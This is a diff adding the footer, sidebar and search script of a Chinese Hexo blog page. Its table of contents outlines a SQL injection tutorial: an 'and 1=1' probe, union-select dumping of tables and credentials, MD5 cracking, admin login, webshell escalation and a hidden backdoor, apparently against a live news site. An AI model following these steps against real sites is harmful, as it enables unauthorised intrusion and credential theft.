+    <strong>Urheberrechtshinweis:  </strong>Alle Artikel in diesem Blog sind unter <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> lizenziert, außer es wird anders angegeben.</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+              <div>
+                
+
+<script src="//cdn.jsdelivr.net/npm/ilyabirman-likely@2/release/likely.js"></script>
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/ilyabirman-likely@2/release/likely.css">
+
+
+  
+
+
+<div class="likely">
+	
+ 	 	<div class="twitter">Tweet</div>
+	
+ 	 	<div class="facebook">Share</div>
+	
+ 	 	<div class="linkedin">Link</div>
+	
+ 	 	<div class="gplus">Plus</div>
+	
+ 	 	<div class="vkontakte">Share</div>
+	
+ 	 	<div class="odnoklassniki">Class</div>
+	
+ 	 	<div class="telegram">Send</div>
+	
+ 	 	<div class="whatsapp">Send</div>
+	
+ 	 	<div class="pinterest">Pin</div>
+	
+</div>
+
+              </div>
+            
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/01/TCP-IP模型/" rel="next" title="TCP--IP模型">
+                <i class="fa fa-chevron-left"></i> TCP--IP模型
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://p1.qqyou.com/touxiang/UploadPic/2015-12/22/719eaa6ec00d16f9dd425e6f7288a49d.jpg" alt="Sumarua">
+            
+              <p class="site-author-name" itemprop="name">Sumarua</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/yourname" title="Weibo &rarr; https://weibo.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://plus.google.com/yourname" title="Google &rarr; https://plus.google.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-google"></i>Google</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/yourname" title="Twitter &rarr; https://twitter.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://www.facebook.com/yourname" title="FB Page &rarr; https://www.facebook.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-facebook"></i>FB Page</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入篇一共分为三讲："><span class="nav-number">1.</span> <span class="nav-text">SQL注入篇一共分为三讲：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#大家知道骇客们攻击网站主要有哪些手法？"><span class="nav-number">1.1.</span> <span class="nav-text">大家知道骇客们攻击网站主要有哪些手法？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一、纸上谈兵"><span class="nav-number">1.2.</span> <span class="nav-text">一、纸上谈兵</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#（一）了解注入原理"><span class="nav-number">1.2.1.</span> <span class="nav-text">（一）了解注入原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（二）架设注入环境"><span class="nav-number">1.2.2.</span> <span class="nav-text">（二）架设注入环境</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-创建一张试验用的数据表："><span class="nav-number">1.2.2.1.</span> <span class="nav-text">1.创建一张试验用的数据表：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-接下来，贴上登录界面的源代码："><span class="nav-number">1.2.2.2.</span> <span class="nav-text">2.接下来，贴上登录界面的源代码：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（三）演示注入手法"><span class="nav-number">1.2.3.</span> <span class="nav-text">（三）演示注入手法　　</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、实战演练"><span class="nav-number">1.3.</span> <span class="nav-text">二、实战演练</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#（二）狼烟四起"><span class="nav-number">1.3.1.</span> <span class="nav-text">（二）狼烟四起</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1。我们打开这个网址，一个新闻网站，-我们点击-百家争鸣-板块，这是一个国内外新闻速览的栏目，好多时政的帖子，我们点击一个，OK，现在进入单个帖子界面，首先我们看下当前帖子的URL地址，"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">1。我们打开这个网址，一个新闻网站，,我们点击[百家争鸣]板块，这是一个国内外新闻速览的栏目，好多时政的帖子，我们点击一个，OK，现在进入单个帖子界面，首先我们看下当前帖子的URL地址，</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2。判断是否存在sql注入可能。在帖子地址后面空上一格，敲入-and-1-1-然后-and-1-2-。这两句什么意思呢？-一个恒等式，一个恒不等式，敲入-and-1-1-帖子返回正常，-and-1-2-时帖子返回出错，说明sql语句被执行，程序没有对敏感字符进行过滤。现在我们可以确定此处是一个SQL注入点，程序对带入的参数没有做任何处理，直接带到数据库的查询语句中。可以推断出在访问"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">2。判断是否存在sql注入可能。在帖子地址后面空上一格，敲入 and 1=1 ,然后 and 1=2 。这两句什么意思呢？ 一个恒等式，一个恒不等式，敲入 and 1=1 帖子返回正常， and 1=2 时帖子返回出错，说明sql语句被执行，程序没有对敏感字符进行过滤。现在我们可以确定此处是一个SQL注入点，程序对带入的参数没有做任何处理，直接带到数据库的查询语句中。可以推断出在访问</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3。爆数据库。确定注入点仅仅意味着开始。现在，我们回到原先的帖子地址："><span class="nav-number">1.3.1.3.</span> <span class="nav-text">3。爆数据库。确定注入点仅仅意味着开始。现在，我们回到原先的帖子地址：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4。爆字段。接着我们再构造如下语句来猜表中字段："><span class="nav-number">1.3.1.4.</span> <span class="nav-text">4。爆字段。接着我们再构造如下语句来猜表中字段：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5。爆表-确定字段之后现在我们要构造联合查询语句-union-select-，语句如下："><span class="nav-number">1.3.1.5.</span> <span class="nav-text">5。爆表.确定字段之后现在我们要构造联合查询语句(union select )，语句如下：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6。爆用户名、密码。我们选择3-吧，OK-现在把3给替换掉，先查询下数据库库名，构造语句如下"><span class="nav-number">1.3.1.6.</span> <span class="nav-text">6。爆用户名、密码。我们选择3 吧，OK,现在把3给替换掉，先查询下数据库库名，构造语句如下</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7。md5解密。"><span class="nav-number">1.3.1.7.</span> <span class="nav-text">7。md5解密。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8。登录后台。"><span class="nav-number">1.3.1.8.</span> <span class="nav-text">8。登录后台。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9。这里我们发现此网站依然采用程序默认管理路径："><span class="nav-number">1.3.1.9.</span> <span class="nav-text">9。这里我们发现此网站依然采用程序默认管理路径：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、扩展部分"><span class="nav-number">1.4.</span> <span class="nav-text">三、扩展部分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#（一）webshell提权"><span class="nav-number">1.4.1.</span> <span class="nav-text">（一）webshell提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（二）暗修栈道"><span class="nav-number">1.4.2.</span> <span class="nav-text">（二）暗修栈道</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后注："><span class="nav-number">1.5.</span> <span class="nav-text">后注：</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sumarua</span>
+
+  
+
+  
+</div>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共17.1k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="150" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    <script type="text/javascript" color="0,0,255" opacity="0.7" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+    </script>
+  
+</body>
+</html>
